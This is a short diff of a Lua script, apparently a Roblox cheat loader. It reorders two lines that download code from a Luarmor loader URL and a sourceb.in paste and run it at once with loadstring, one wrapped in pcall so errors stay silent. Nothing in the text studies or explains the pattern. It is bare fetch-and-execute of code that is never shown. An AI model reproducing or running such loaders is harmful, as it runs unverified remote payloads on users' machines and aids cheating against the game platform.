@@ -1,10 +1,7 @@
--- 1
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/710f9ca559d26ae153f09264a0339ebc.lua"))()
--- 2
-task.wait(5)
--- 3
 task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://cdn.sourceb.in/bins/HRrwbu9nGU/0", true))()
     end)
 end)
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/710f9ca559d26ae153f09264a0339ebc.lua"))()
